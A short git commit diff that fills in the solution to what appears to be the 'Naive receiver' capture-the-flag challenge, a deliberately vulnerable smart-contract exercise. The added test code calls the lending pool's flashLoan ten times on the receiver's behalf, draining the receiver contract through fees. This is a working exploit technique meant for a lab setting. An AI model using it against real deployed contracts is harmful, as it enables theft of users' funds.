b5643bb01135cdeb1862202b3334c547d6606edb
Vivek Singh Bhadauria <viveksbhadauria007@gmail.com>
2022-01-08 22:28:19 +0530

    solved 2nd one

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -31,6 +31,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1000'), {
+                from: this.attacker
+            });
+        }
     });
 
     after(async function () {
